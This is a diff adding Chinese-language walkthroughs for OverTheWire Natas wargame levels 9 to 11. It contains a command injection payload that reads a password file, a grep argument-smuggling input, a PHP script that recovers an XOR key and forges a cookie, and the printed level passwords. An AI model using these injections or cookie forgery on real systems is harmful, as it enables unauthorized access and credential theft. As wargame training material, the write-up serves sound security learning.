@@ -363,3 +363,299 @@ title: OverTheWire：Natas
   ```
 - 提交即可获取口令<br>
 ![W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl](img/natas16.jpg)
+
+## Level 9
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas9</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas9.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 要求的输入发生变化了<br>
+![Find words containing](img/natas17.jpg)
+- 总之先查看源代码
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas9</h1>
+  <div id="content">
+  <form>
+  Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+  </form>
+
+
+  Output:
+  <pre>
+  <?
+  $key = "";
+
+  if(array_key_exists("needle", $_REQUEST)) {
+      $key = $_REQUEST["needle"];
+  }
+
+  if($key != "") {
+      passthru("grep -i $key dictionary.txt");
+  }
+  ?>
+  </pre>
+
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 输入没有经过任何处理直接放到命令字符串里了！这样一来，可就不能只执行一个命令了哦~👿提交`;cat /etc/natas_webpass/natas10 #`，拼接后的命令如下
+  ```bash
+  grep -i ;cat /etc/natas_webpass/natas10 # dictionary.txt
+  ```
+- 成功获得下一关的口令<br>
+![nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu](img/natas18.jpg)
+
+## Level 10
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas10</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas10.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 这回会过滤掉一些字符(ŏωŏ)<br>
+![For security reasons, we now filter on certain characters](img/natas19.jpg)
+- 通过源代码，发现分隔符被过滤掉了(╥ω╥)
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas10</h1>
+  <div id="content">
+
+  For security reasons, we now filter on certain characters<br/><br/>
+  <form>
+  Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+  </form>
+
+
+  Output:
+  <pre>
+  <?
+  $key = "";
+
+  if(array_key_exists("needle", $_REQUEST)) {
+      $key = $_REQUEST["needle"];
+  }
+
+  if($key != "") {
+      # 过滤掉了分隔符
+      if(preg_match('/[;|&]/',$key)) {
+          print "Input contains an illegal character!";
+      } else {
+          passthru("grep -i $key dictionary.txt");
+      }
+  }
+  ?>
+  </pre>
+
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 不过，`grep`可以同时处理多个文件，那么只要猜测`/etc/natas_webpass/natas11`文件内容中的一个字符就可以啦~（推荐猜数字(<ゝωΦ)，*0-9* 就可以，同时 *dictionary.txt* 文件中也不含数字）
+  > Usage: grep [OPTION]... PATTERN [FILE]...
+- 提交`1 /etc/natas_webpass/natas11`，惊喜！<br>
+![/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK](img/natas20.jpg)
+
+## Level 11
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas11</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas11.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 可以通过表单提交并设置背景颜色，提示：*Cookies 受异或加密保护* ？<br>
+![Cookies are protected with XOR encryption](img/natas21.jpg)
+- 查看网页源代码，了解到需要通过 *Cookie* 设置`showpassword`的值为`yes`
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <?
+
+  # 变量 $defaultdata 中 showpassword 的初始值为 no
+  $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+  function xor_encrypt($in) {
+      $key = '<censored>';
+      $text = $in;
+      $outText = '';
+
+      // Iterate through each character
+      for($i=0;$i<strlen($text);$i++) {
+      # 异或运算，可通过将输入和输出异或得到变量 $key
+      $outText .= $text[$i] ^ $key[$i % strlen($key)];
+      }
+
+      return $outText;
+  }
+
+  function loadData($def) {
+      # HTTP 请求头中包含的 Cookie 主要用于传递 showpassword 的值
+      global $_COOKIE;
+      $mydata = $def;
+      if(array_key_exists("data", $_COOKIE)) {
+      $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+      if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+          if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+          $mydata['showpassword'] = $tempdata['showpassword'];
+          $mydata['bgcolor'] = $tempdata['bgcolor'];
+          }
+      }
+      }
+      return $mydata;
+  }
+
+  # 保存到 Cookie 中
+  function saveData($d) {
+      setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+  }
+
+  # 将 Cookie 的值经过 Base64 解码、与密钥异或并转化为 json 格式赋值给变量 $data
+  $data = loadData($defaultdata);
+
+  # 接收通过 GET 请求（表单）提交的背景颜色并设置
+  if(array_key_exists("bgcolor",$_REQUEST)) {
+      if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+          $data['bgcolor'] = $_REQUEST['bgcolor'];
+      }
+  }
+
+  saveData($data);
+
+  ?>
+
+  <h1>natas11</h1>
+  <div id="content">
+  <body style="background: <?=$data['bgcolor']?>;">
+  Cookies are protected with XOR encryption<br/><br/>
+
+  <?
+  # 需要得到包含 $data["showpassword"] == "yes" 对应的 Cookie
+  if($data["showpassword"] == "yes") {
+      print "The password for natas12 is <censored><br>";
+  }
+
+  ?>
+
+  <form>
+  Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
+  <input type=submit value="Set color">
+  </form>
+
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 直接提交表单，获得变量`$defaultdata`对应的 *Cookie*<br>
+![data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=](img/natas22.jpg)
+- 通过异或获得变量`$key`的值
+  ```php
+  <?php
+  # calc.php
+  $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+  $data = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
+
+  function xor_encrypt($in, $out) {
+      $outText = '';
+      for($i=0;$i<strlen($in);$i++) {
+      $outText .= $in[$i] ^ $out[$i % strlen($out)];
+      }
+      return $outText;
+  }
+
+  echo xor_encrypt(base64_decode($data), json_encode($defaultdata));
+  ?>
+  ```
+- 循环节长度为 4，轻松获得`$key`值：*qw8J*
+  ```bash
+  $ php -f calc.php
+  qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+  ```
+- 接下来获取目标 *Cookie*
+  ```bash
+  $ php -f calc.php
+  ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+  ```
+  ```php
+  <?php
+  # calc.php
+  $targetdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+
+  function xor_encrypt($in) {
+      $key = 'qw8J';
+      $text = $in;
+      $outText = '';
+      for($i=0;$i<strlen($text);$i++) {
+      $outText .= $text[$i] ^ $key[$i % strlen($key)];
+      }
+      return $outText;
+  }
+
+  echo base64_encode(xor_encrypt(json_encode($targetdata)));
+  ?>
+  ```
+- 编辑原 HTTP 请求头中的 *Cookie* 的值，并再次发送，成功获取下一关口令<br>
+![EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3](img/natas23.jpg)
